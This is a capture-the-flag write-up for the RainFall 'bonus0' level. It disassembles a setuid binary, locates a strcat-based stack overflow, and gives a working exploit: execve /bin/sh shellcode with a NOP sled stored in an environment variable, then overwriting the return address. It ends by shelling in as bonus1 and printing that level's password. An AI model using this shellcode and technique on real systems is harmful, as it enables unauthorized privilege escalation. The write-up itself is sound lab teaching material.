# bonus0

## Hint

When we log into the machine as `bonus0`, we notice a binary:

```shell-session
bonus0@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus1 users 5566 Mar  6  2016 bonus0
```

We notice that the `guid` bit is set, so the executable gets the rights of its group owners granted when it is executed, and conveniently enough the group in question is our target for the current level.

That being said, it seems we need to look into the binary in order to try to understand what input it's awaiting.

After a simple execution of the binary the program prints:

```shell-session
bonus0@RainFall:~$ ./bonus0
 -
```

It seems that th e program is waiting for two inputs on `stdin` and prints them.

```shell-session
bonus0@RainFall:~$ ./bonus0
 -
a
 -
b
a b
```

It seems that after a long enough input it began to print the second input, then the second input.
It seems that there are two buffer overflows in this program.

```shell-session
bonus0@RainFall:~$ ./bonus0
 -
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 -
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbb�� bbbbbbbbbbbbbbbbbbbb��
Segmentation fault (core dumped)
```

Ok let's disas this binary before going further.

## gdb

### functions

```gdb
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  read
0x08048380  read@plt
0x08048390  strcat
0x08048390  strcat@plt
0x080483a0  strcpy
0x080483a0  strcpy@plt
0x080483b0  puts
0x080483b0  puts@plt
[...]
0x080483d0  strchr
0x080483d0  strchr@plt
[...]
0x080483f0  strncpy
0x080483f0  strncpy@plt
[...]
0x080484b4  p
0x0804851e  pp
0x080485a4  main
[...]
```

No C++ functions. Yey !.

We habe here the following functions:

#### disas main

```gdb
gdb-peda$ disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:	push   ebp
   0x080485a5 <+1>:	mov    ebp,esp
   0x080485a7 <+3>:	and    esp,0xfffffff0
   0x080485aa <+6>:	sub    esp,0x40                  <--|Alignement of a pointer char *s[54] bytes
   0x080485ad <+9>:	lea    eax,[esp+0x16]            <--|
   0x080485b1 <+13>:	mov    DWORD PTR [esp],eax
   0x080485b4 <+16>:	call   0x804851e <pp>            <-- Call to pp(s)
   0x080485b9 <+21>:	lea    eax,[esp+0x16]
   0x080485bd <+25>:	mov    DWORD PTR [esp],eax
   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:	mov    eax,0x0
   0x080485ca <+38>:	leave
   0x080485cb <+39>:	ret
End of assembler dump.
```

#### disas pp

```gdb
gdb-peda$ disas pp
Dump of assembler code for function pp:
   0x0804851e <+0>:	push   ebp
   0x0804851f <+1>:	mov    ebp,esp
   0x08048521 <+3>:	push   edi
   0x08048522 <+4>:	push   ebx
   0x08048523 <+5>:	sub    esp,0x50                         <-- Space of 80 bytes to align 76 bytes of the stack frame (2 pointer char of 20 bytes and 1 pointer of 12 bytes)
   0x08048526 <+8>:	mov    DWORD PTR [esp+0x4],0x80486a0    <-- Loading char *dash
   0x0804852e <+16>:	lea    eax,[ebp-0x30]                   <-- Loading char *a
   0x08048531 <+19>:	mov    DWORD PTR [esp],eax
   0x08048534 <+22>:	call   0x80484b4 <p>                    <-- Call to p(s, dash)
   0x08048539 <+27>:	mov    DWORD PTR [esp+0x4],0x80486a0    <-- Loading char *dash with Offset of 12 bytes
   0x08048541 <+35>:	lea    eax,[ebp-0x1c]                   <-- Loading char *b
   0x08048544 <+38>:	mov    DWORD PTR [esp],eax
   0x08048547 <+41>:	call   0x80484b4 <p>
   0x0804854c <+46>:	lea    eax,[ebp-0x30]                   <-- Loading char *a
   0x0804854f <+49>:	mov    DWORD PTR [esp+0x4],eax
   0x08048553 <+53>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048556 <+56>:	mov    DWORD PTR [esp],eax
   0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
   0x0804855e <+64>:	mov    ebx,0x80486a4
   0x08048563 <+69>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048566 <+72>:	mov    DWORD PTR [ebp-0x3c],0xffffffff
   0x0804856d <+79>:	mov    edx,eax
   0x0804856f <+81>:	mov    eax,0x0
   0x08048574 <+86>:	mov    ecx,DWORD PTR [ebp-0x3c]
   0x08048577 <+89>:	mov    edi,edx
   0x08048579 <+91>:	repnz scas al,BYTE PTR es:[edi]
   0x0804857b <+93>:	mov    eax,ecx
   0x0804857d <+95>:	not    eax
   0x0804857f <+97>:	sub    eax,0x1
   0x08048582 <+100>:	add    eax,DWORD PTR [ebp+0x8]
   0x08048585 <+103>:	movzx  edx,WORD PTR [ebx]
   0x08048588 <+106>:	mov    WORD PTR [eax],dx
   0x0804858b <+109>:	lea    eax,[ebp-0x1c]
   0x0804858e <+112>:	mov    DWORD PTR [esp+0x4],eax
   0x08048592 <+116>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048595 <+119>:	mov    DWORD PTR [esp],eax
   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
   0x0804859d <+127>:	add    esp,0x50
   0x080485a0 <+130>:	pop    ebx
   0x080485a1 <+131>:	pop    edi
   0x080485a2 <+132>:	pop    ebp
   0x080485a3 <+133>:	ret
End of assembler dump.
```

#### disas p

```gdb
gdb-peda$ disas p
Dump of assembler code for function p:
   0x080484b4 <+0>:	push   ebp
   0x080484b5 <+1>:	mov    ebp,esp
   0x080484b7 <+3>:	sub    esp,0x1018
   0x080484bd <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080484c0 <+12>:	mov    DWORD PTR [esp],eax
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:	mov    DWORD PTR [esp+0x8],0x1000
   0x080484d0 <+28>:	lea    eax,[ebp-0x1008]
   0x080484d6 <+34>:	mov    DWORD PTR [esp+0x4],eax
   0x080484da <+38>:	mov    DWORD PTR [esp],0x0
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
   0x080484e6 <+50>:	mov    DWORD PTR [esp+0x4],0xa
   0x080484ee <+58>:	lea    eax,[ebp-0x1008]
   0x080484f4 <+64>:	mov    DWORD PTR [esp],eax
   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:	mov    BYTE PTR [eax],0x0
   0x080484ff <+75>:	lea    eax,[ebp-0x1008]
   0x08048505 <+81>:	mov    DWORD PTR [esp+0x8],0x14
   0x0804850d <+89>:	mov    DWORD PTR [esp+0x4],eax
   0x08048511 <+93>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048514 <+96>:	mov    DWORD PTR [esp],eax
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:	leave
   0x0804851d <+105>:	ret
End of assembler dump.
```

## crashing the bin

We notice that if we feed reads that are greater or equal to 20 chars to the binary, the `puts` function will print all the content of the buffer and then crash because of the lack of `\0` character.

With that in mind, we know that there is a buffer overflow possible thanks to the use of the `strcat` function that does not check for the boundaries of the arguments that are passed to it.

From that, where can we go ?

First, we must find the offset of the buffer that leads to a crash in order to see what room we have for our hack.

### finding the offset 

Once again, with our trusted [Buffer Overflow Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/), we can check what is the offset of the buffer that makes the program crash. 

```gdb
gdb-peda$ run
 -
AAAAAAAAAAAAAAAAAAAA
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
AAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa� Aa0Aa1Aa2Aa3Aa4Aa5Aa�

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0xb7fd0ff4 --> 0x1a4d7c
ECX: 0xffffffff
EDX: 0xb7fd28b8 --> 0x0
ESI: 0x0
EDI: 0x0
EBP: 0x32614131 ('1Aa2')
ESP: 0xbffffb90 ("a4Aa5Aa\364", <incomplete sequence \375\267>)
EIP: 0x41336141 ('Aa3A')
EFLAGS: 0x210286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41336141
[------------------------------------stack-------------------------------------]
0000| 0xbffffb90 ("a4Aa5Aa\364", <incomplete sequence \375\267>)
0004| 0xbffffb94 --> 0xf4614135
0008| 0xbffffb98 --> 0xb7fd0f
0012| 0xbffffb9c --> 0xb7fdc858 --> 0xb7e2c000 --> 0x464c457f
0016| 0xbffffba0 --> 0x0
0020| 0xbffffba4 --> 0xbffffc1c --> 0xb7fff918 --> 0x0
0024| 0xbffffba8 --> 0xbffffc30 --> 0xbffffe24 ("SHELL=/bin/bash")
0028| 0xbffffbac --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41336141 in ?? ()         <-- address of overwritten register
```

1. we feed to the first read a string of 20 characters long, minimum. This will prevent the injection of a `\0`.
2. we feed to the second read a huge input string (generated from our trusty website)

By feeding this address (`0x41336141`) to the generator, it returns an offset of `9`.

## Working in a tight space

So a buffer offset of 9 is not convenient enough for us to do a common buffer overflow attack.

There is another way though. We could use an environment variable to store our shellcode instead.

This would just require us to:
1. find a shellcode that opens a shell
   - Lets use the one from the previous exercise since we know it works
2. store that shellcode in in and env variable
   - ez pz lemon squeazy
3. find the address of said variable and make `strcat` do all the heavy lifting
   - Just print address of variable in gdb
       ```gdb
       gdb-peda$ x/s *((char **)environ+0)
       0xbfffed68:	 "SHELL=/bin/bash"
       gdb-peda$ x/s *((char **)environ)
       0xbfffed68:	 "SHELL=/bin/bash"
       gdb-peda$ x/s *((char **)environ+1)
       0xbfffed78:	 "TERM=alacritty"
       gdb-peda$ x/s *((char **)environ+2)
       0xbfffed87:	 "SSH_CLIENT=192.168.56.1 46750 4242"
       gdb-peda$ x/s *((char **)environ+3)
       0xbfffedaa:	 "SSH_TTY=/dev/pts/0"
       gdb-peda$ x/s *((char **)environ+4)
       0xbfffedbd:	 "USER=bonus0"
       gdb-peda$ x/s *((char **)environ+5)
       0xbfffedc9:	 "LS_COLORS="
       gdb-peda$ x/s *((char **)environ+6)
       0xbfffedd4:	 "COLUMNS=192"
       gdb-peda$ x/s *((char **)environ+7)
       0xbfffede0:	 "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
       gdb-peda$ x/s *((char **)environ+8)
       0xbfffee2d:	 "MAIL=/var/mail/bonus0"
       gdb-peda$ x/s *((char **)environ+9)
       0xbfffee43:	 "_=/usr/bin/gdb"
       gdb-peda$ x/s *((char **)environ+10)
       0xbfffee52:	 "PWD=/home/user/bonus0"
       gdb-peda$ x/s *((char **)environ+11)
       0xbfffee68:	 "LANG=en_US.UTF-8"
       gdb-peda$ x/s *((char **)environ+12)
       0xbfffee79:	 "BESTEXPLOITEVER=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
       ```

## EXPLOITEVER

```shell-session
export BESTEXPLOITEVER=`python -c 'print("\x90" * 4242 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
```

```shell-session
(python -c "print '\x90' * 4095 + '\n' + '\x90' * 9 + '\x79\xee\xff\xbf' + '\x90' * 100"; cat -) | ./bonus0
 -
 -
y� y�
whoami
<+ '\x90' * 9 + '\x79\xee\xff\xbf' + '\x90' * 100"; cat -) | ./bonus0
 -
 -
y�� y��
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
